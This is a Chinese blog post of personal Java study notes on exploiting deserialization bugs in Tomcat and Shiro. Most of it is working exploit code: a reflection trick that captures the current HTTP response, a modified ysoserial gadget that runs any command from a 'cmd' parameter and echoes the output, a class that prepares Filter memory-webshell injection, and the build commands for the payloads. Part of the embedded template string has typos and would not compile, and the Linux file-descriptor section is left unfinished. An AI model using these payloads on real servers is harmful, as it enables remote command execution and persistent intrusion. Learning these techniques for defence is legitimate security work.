---
title: "Java学习笔记Ⅶ"
slug: ""
description: "谭谈回显；文件描述符方法本地尚未调通 待更新..."
date: 2022-09-13T11:27:04+08:00
categories: ["NOTES&SUMMARY"]
series: ["Java学习笔记"]
tags: ["Java"]
draft: false
toc: true
---

菜鸡水平，一篇笔记性质的纯水文，如有错漏还请指正QwQ

*所有参考文章统一放文末

## 关于回显

在我刚开始学内存马相关问题时，我其实没理解很多文章里在追求的“回显”是啥意思——因为起初都是拿着jsp来注内存马，所以对“回显”比较无感，直到开始学习反序列化注入内存马时才开始感受到“回显”的重要性；不同于jsp，通过反序列化注入时往往是能有一个点可以任意执行字节码，我们能控制的是一段java代码，显然不具备jsp那种得天独厚的条件（不再有拿来即用的request和response对象），就需要先从上下文环境中找到含有request/response的对象，然后再加以利用

## Linux文件描述符回显法

所以问题理所当然的就从回显 转换为了寻找含有request/response的对象，了吗？在此之前我们可以先换个角度看问题（短暂跑个大题）

### 文件描述符

众所周知，Linux中一切皆文件，网络连接也可以通过文件描述符来获取，比如`/proc/net/tcp`和`/proc/net/tcp6`

![image-20220901172504445](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901172504445.png)

这里local_address是16进制的写法，我们可以先转10进制再用php的long2ip来复原，或者python也可

```python
long = 0x0801A8C0
def long2ip(long):
	floor_list = []
	num = long
	for i in reversed(range(4)):
		res = divmod(num, 256**i)
		floor_list.append(str(res[0]))
		num = res[1]
	floor_list.reverse()
	return '.'.join(floor_list)
ip = long2ip(long)
print(ip)
# 192.168.1.8
```

根据remote ip对应socket连接的inode可以反查该进程的fd

![image-20220906222029548](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220906222029548.png)

### ***实现回显

利用上面的技巧，调用java代码打开对应的fd并直接操作即可实现回显；说的简单，来个demo试试

由于我实在是太菜了，这里本地一直没有调通，我直接就是一个滑跪

之后会继续搞得，调通以后我必更新本文

## 寻找上下文response法

上面那种方法虽然看着很强，但是仅局限Linux，要想寻求通杀还得专心找request/response

### 找response

以springboot项目为例，写一个controller用作测试

```java
@Controller
public class VulnController {
    @ResponseBody
    @RequestMapping("/vuln")
    public String vuln(String input, HttpServletResponse response) throws Exception{
        System.out.println(response);
        return input;
    }
}
```

在调用栈里可以看到这个response被一直传递，没有什么变化（ResponseFacade是门面模式下的产物 也是一直不变的）（变量之后的`@xxxx`是对变量内容哈希的部分值，可以通过这个来判断变量是否发生变化）

![image-20220901095631357](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901095631357.png)

![image-20220901095734155](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901095734155.png)

所以我们只要从这一堆堆栈里找任意一个类的response实例即可，为了确保尽可能的通杀 我们还需要只寻找tomcat部分的代码

但是直接看代码会发现大部分的request/response是通过传参的方式进行传递（被invoke调用），为此我们应该关注这两个变量在中间有没有被记录过，并且被记录的值不应该是全局变量 而应该是ThreadLocal，这样才能获取到当前线程的请求信息；最好还是一个static静态变量，否则我们还需要获取那个变量所在的实例

在`org.apache.catalina.core.ApplicationFilterChain`这个类中找到了符合要求的变量（第一个发现的师傅tql）

![image-20220901101726247](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901101726247.png)

![image-20220901101918880](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901101918880.png)

在这个try catch中response被放入`lastServicedResponse`，虽然if中的`WRAP_SAME_OBJECT`是false，但是我们可以通过反射来修改，让它进入这个if，之后初始化`lastServicedResponse`和`lastServicedRequest`（默认为null），从`lastServicedResponse`中获取当前请求response并回显内容

### 接入ysoserial

```java
// 反射获取变量
Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
WRAP_SAME_OBJECT_FIELD.setAccessible(true);
lastServicedRequestField.setAccessible(true);
lastServicedResponseField.setAccessible(true);
// 通过modifiers反射修改static final字段
Field modifiersFiled = Field.class.getDeclaredField("modifiers");
modifiersFiled.setAccessible(true);
modifiersFiled.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &~Modifier.FINAL);
modifiersFiled.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &~Modifier.FINAL);
modifiersFiled.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &~Modifier.FINAL);

ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
String cmd = lastServicedRequest != null
        ? lastServicedRequest.get().getParameter("cmd") // 寻找cmd参数
        : null;
if(!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null){
    lastServicedRequestField.set(null, new ThreadLocal<>());
    lastServicedResponseField.set(null, new ThreadLocal<>());
    WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
} else if (cmd != null) {
    // 获取response对象 在原本回显之后添加我们的内容
    ServletResponse responseFacade = lastServicedResponse.get();
    responseFacade.getWriter();
    java.io.Writer w = responseFacade.getWriter();
    Field responseFiled = ResponseFacade.class.getDeclaredField("response");
    responseFiled.setAccessible(true);
    Response response = (Response) responseFiled.get(responseFacade);
    Field usingWriter = Response.class.getDeclaredField("usingWriter");
    usingWriter.setAccessible(true);
    usingWriter.setAccessible(true);
    usingWriter.set((Object) response, Boolean.FALSE);
    // 回显八股
    boolean isLinux = true;
    String osTyp = System.getProperty("os.name");
    if(osTyp != null && osTyp.toLowerCase().contains("win")){
        isLinux = false;
    }
    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
    Scanner s = new Scanner(in).useDelimiter("\\a");
    String output = s.hasNext()?s.next():"";
    w.write(output);
    w.flush();
```

已经有了这样的模板，如何接入ysoserail的createsTemplatesImpl中呢？我们看payloads.util.Gagests.java中一般的模板都长这样

```java
public static Object createTemplatesImpl(final String command) throws Exception {
    return createTemplatesImpl(command, "");
}
```

我们也照猫画虎即可，擦去泛型的部分，并改用完整的类名；同时把command稍作修改，让原本命令行控制的cmd参数变为web请求需要的参数

```java
// https://github.dev/kingkaki/ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java
public static Object createTemplatesImplTomcatEcho(final String command) throws Exception {
    String param = command == null ? "cmd" : command;
    String template = "try {\n" +
        "    java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName(\"org.apache.catalina.coreApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\");\n" +
        "    java.lang.reflect.Field lastServicedRequestField = org.apache.catalina.core.ApplicationFilterChainclass.getDeclaredField(\"lastServicedRequest\");\n" +
        "    java.lang.reflect.Field lastServicedResponseField = org.apache.catalina.core.ApplicationFilterChainclass.getDeclaredField(\"lastServicedResponse\");\n" +
        "    java.lang.reflect.Field modifiersField = java.lang.reflect.Field.class.getDeclaredField(\"modifiers\")\n" +
        "    modifiersField.setAccessible(true);\n" +
        "    modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, 8);\n" +
        "    modifiersField.setInt(lastServicedRequestField, 10);\n" +
        "    modifiersField.setInt(lastServicedResponseField, 10);\n" +
        "    WRAP_SAME_OBJECT_FIELD.setAccessible(true);\n" +
        "    lastServicedRequestField.setAccessible(true);\n" +
        "    lastServicedResponseField.setAccessible(true);\n" +
        "\n" +
        "    ThreadLocal lastServicedResponse = lastServicedResponseField.get(null) != null\n" +
        "        ? (ThreadLocal) lastServicedResponseField.get(null)\n" +
        "        : null;\n" +
        "    ThreadLocal lastServicedRequest = lastServicedRequestField.get(null) != null\n" +
        "        ? (ThreadLocal) lastServicedRequestField.get(null)\n" +
        "        : null;\n" +
        "    boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);\n" +
        "    String cmd = lastServicedRequest != null\n" +
        "        ? ((javax.servlet.ServletRequest) lastServicedRequest.get()).getParameter(\"" + command + "\"\n" +
        "        : null;\n" +
        "    if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {\n" +
        "        lastServicedRequestField.set(null, new ThreadLocal());\n" +
        "        lastServicedResponseField.set(null, new ThreadLocal());\n" +
        "        WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);\n" +
        "    } else if (cmd != null) {\n" +
        "        javax.servlet.ServletResponse responseFacade = (javax.servlet.ServletResponse)lastServicedResponse.get();\n" +
        "        responseFacade.getWriter();\n" +
        "        java.io.Writer w = responseFacade.getWriter();\n" +
        "        java.lang.reflect.Field responseField = org.apache.catalina.connector.ResponseFacade.classgetDeclaredField(\"response\");\n" +
        "        responseField.setAccessible(true);\n" +
        "        org.apache.catalina.connector.Response response = (org.apache.catalina.connector.Response)responseField.get(responseFacade);\n" +
        "        java.lang.reflect.Field usingWriter = org.apache.catalina.connector.Response.class.getDeclaredFiel(\"usingWriter\");\n" +
        "        usingWriter.setAccessible(true);\n" +
        "        usingWriter.set((Object) response, Boolean.FALSE);\n" +
        "\n" +
        "        boolean isLinux = true;\n" +
        "        String osTyp = System.getProperty(\"os.name\");\n" +
        "        if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n" +
        "            isLinux = false;\n" +
        "        }\n" +
        "        String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\",cmd};\n" +
        "        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
        "        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
        "        String output = s.hasNext() ? s.next() : \"\";\n" +
        "        w.write(output);\n" +
        "        w.flush();\n" +
        "    }\n" +
        "} catch (Exception e) {\n" +
        "}";
    return createTemplatesImpl(command, template);
}
```

然后在payloads处添加对应的类（直接继承原有的CommonsCollectionsx即可）

```java
// https://github.dev/kingkaki/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2TomcatEcho.java
package ysoserial.payloads;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.PriorityQueue;
import java.util.Queue;

public class CommonsCollections2TomcatEcho extends CommonsCollections2 {
    @Override
    public Queue<Object> getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImplTomcatEcho(command);
        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return queue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections2TomcatEcho.class, args);
    }
}
```

打包ysosrial

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2TomcatEcho cmd
```

这样就相当于创建了一个从cmd参数获取要执行的命令的payload

### 适配shiro550

上面这种方法已经很好了，但仍然存在一点点小限制

```java
private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {
    if (this.pos < this.n) {
        ApplicationFilterConfig filterConfig = this.filters[this.pos++];
        try {
            Filter filter = filterConfig.getFilter();
            if (request.isAsyncSupported() && "false".equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) {
                request.setAttribute("org.apache.catalina.ASYNC_SUPPORTED", Boolean.FALSE);
            }
            if (Globals.IS_SECURITY_ENABLED) {
                Principal principal = ((HttpServletRequest)request).getUserPrincipal();
                Object[] args = new Object[]{request, response, this};
                SecurityUtil.doAsPrivilege("doFilter", filter, classType, args, principal);
            } else {
                filter.doFilter(request, response, this);
            }
        } catch (ServletException | RuntimeException | IOException var15) {
            throw var15;
        } catch (Throwable var16) {
            Throwable e = ExceptionUtils.unwrapInvocationTargetException(var16);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString("filterChain.filter"), e);
        }
    } else {
        try {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set(request);
                lastServicedResponse.set(response);
            }
            if (request.isAsyncSupported() && !this.servletSupportsAsync) {
                request.setAttribute("org.apache.catalina.ASYNC_SUPPORTED", Boolean.FALSE);
            }
            if (request instanceof HttpServletRequest && response instanceof HttpServletResponse && GlobalsIS_SECURITY_ENABLED) {
                Principal principal = ((HttpServletRequest)request).getUserPrincipal();
                Object[] args = new Object[]{request, response};
                SecurityUtil.doAsPrivilege("service", this.servlet, classTypeUsedInService, args, principal);
            } else {
                this.servlet.service(request, response);
            }
        } catch (ServletException | RuntimeException | IOException var17) {
            throw var17;
        } catch (Throwable var18) {
            Throwable e = ExceptionUtils.unwrapInvocationTargetException(var18);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString("filterChain.servlet"), e);
        } finally {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set((Object)null);
                lastServicedResponse.set((Object)null);
            }
        }
    }
}
```

我们仔细看lastServicedRequest出现的位置，是在所有的Filter都执行完毕后才会进行set，而shiro的rememberMe功能就是shiro自己实现的一个filter，常规的打法都是将payload塞入rememberMe中，所以当获取到lastServicedRequest/Response时已经反序列化完了，就不可能再注入内存马了

既然如此，我们就以毒攻毒——动态注册一个Filter内存马并把它放在最前面，先于shiro的rememberMe执行

其实本质和上面的是一样的，我们将那一段恶意代码手动放入继承了AbstractTranslet的类中

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/**
 * @author threedr3am
 */
public class TomcatEchoInject  extends AbstractTranslet {

  static {
    try {
      /*刚开始反序列化后执行的逻辑*/
      //修改 WRAP_SAME_OBJECT 值为 true
      Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
      java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
      java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
      modifiersField.setAccessible(true);
      modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
      f.setAccessible(true);
      if (!f.getBoolean(null)) {
        f.setBoolean(null, true);
      }

      //初始化 lastServicedRequest
      c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
      f = c.getDeclaredField("lastServicedRequest");
      modifiersField = f.getClass().getDeclaredField("modifiers");
      modifiersField.setAccessible(true);
      modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
      f.setAccessible(true);
      if (f.get(null) == null) {
        f.set(null, new ThreadLocal());
      }

      //初始化 lastServicedResponse
      f = c.getDeclaredField("lastServicedResponse");
      modifiersField = f.getClass().getDeclaredField("modifiers");
      modifiersField.setAccessible(true);
      modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
      f.setAccessible(true);
      if (f.get(null) == null) {
        f.set(null, new ThreadLocal());
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  @Override
  public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

  }

  @Override
  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
      throws TransletException {

  }
}
```

编译后生成TomcatEchoInject.class字节码，我们继续稍稍改造一下createsTemplatesImpl（上一个Part里是直接粘了恶意代码然后调用createsTemplatesImpl，这里我们已经单独生成了class）

```java
public static Object createTemplatesImpl ( final String command) throws Exception {
    return createTemplatesImpl(command, null);
}

public static Object createTemplatesImpl ( final String command, final Class c ) throws Exception {
    if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
        return createTemplatesImpl(
            command, c,
            Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
            Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
            Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
    }

    return createTemplatesImpl(command, c, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
}


public static <T> T createTemplatesImpl ( final String command, Class c, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        throws Exception {
    final T templates = tplClass.newInstance();
    final byte[] classBytes;
    if (c == null) {
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        classBytes = clazz.toBytecode();
    } else {
        classBytes = ClassFiles.classAsBytes(c);
    }


    // inject class bytes into instance
    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
        classBytes, ClassFiles.classAsBytes(Foo.class)
    });

    // required to make TemplatesImpl happy
    Reflections.setFieldValue(templates, "_name", "Pwnr");
    Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
    return templates;
}
```

我们根据需求增加了接收对应参数的createsTemplatesImpl（接收class，直接转为字节数组并放入TemplatesImpl的_bytescodes字段中）

修改完Gadgets我们还要修改对应的payload，在调用Gadgets的地方修改为

```java
final Object templates = Gadgets.createTemplatesImpl(null, TomcatEchoInject.class);
```

我们这里直接将command忽略了，还需要再把GeneratePayload修改一下

```java
if(args.length < 1){
	printUsage();
	System.exit(USAGE_CODE);
}
```

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatEchoInject > ./test.ser
```

用这个命令生成的反序列化内容攻击之后还不能上马，只是可以获得request和response对象

```java
java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
f.setAccessible(true);
ThreadLocal t = (ThreadLocal) f.get(null);
// 不为空则意味着第一次反序列化的准备工作已成功
ServletRequest servletRequest = (ServletRequest) t.get()
```

然后就是动态注入Filter，常规的八股是这样的：

1. 通过反射，从request对象中获取Tomcat中控制Web应用的Context对象（StandardContext对象）
2. 利用获取的StandardContext对象获取上下文中的filterConfigs对象
3. 注册一个Filter对象并重写其doFilter方法，在其中执行系统命令并通过response返回
4. 创建FilterDef对象并利用刚创建的Filter对象完成初始化，并新建一个FilterMap对象，为创建的FilterDef对象添加URL映射
5. 利用创建的FilterConfig对象，并使用刚创建的FilterDef对象初始化，最后加入FilterConfigs中，等待filterChain.doFilter调用

这里差不多，但是三梦师傅用了一个比较曲折的方法（不过也是反射 通过修改state值来添加filter），这块更多的就不详细说了，在[上一篇笔记](https://amiaaaz.github.io/2022/05/30/java-study-notes-05/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)里以cc11为例详细写了如何接入冰蝎和哥斯拉

----

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}

[Linux 系统文件描述符继承带来的危害](http://www.hackdig.com/?01/hack-146.htm)  |  [PHP端口复用的利用](http://www.phpweblog.net/GaRY/archive/2011/10/09/PHP_Port_Reuse_With_Apache_FD.html) ([code](https://gist.github.com/wofeiwo/66d7e227caa66e448419))

[深入理解linux系统下proc文件系统内容](https://www.cnblogs.com/cute/archive/2011/04/20/2022280.html)  |  [linux系统编程之进程（三）：进程复制fork，孤儿进程，僵尸进程 ](https://www.cnblogs.com/mickole/p/3186441.html)

[通杀漏洞利用回显方法-linux平台](https://www.00theway.org/2020/01/17/java-god-s-eye/)  |  [linux下java反序列化通杀回显方法的低配版实现](https://xz.aliyun.com/t/7307)  |  [Linux下文件描述符回显构造](http://www.foreversong.cn/archives/1459)

[Tomcat中一种半通用回显方法](https://xz.aliyun.com/t/7348)  |  [基于tomcat的内存 Webshell 无文件攻击技术](https://xz.aliyun.com/t/7388)

[Java反射-修改字段值, 反射修改static final修饰的字段 ](https://www.cnblogs.com/noKing/p/9038234.html)

{{% /spoiler %}}
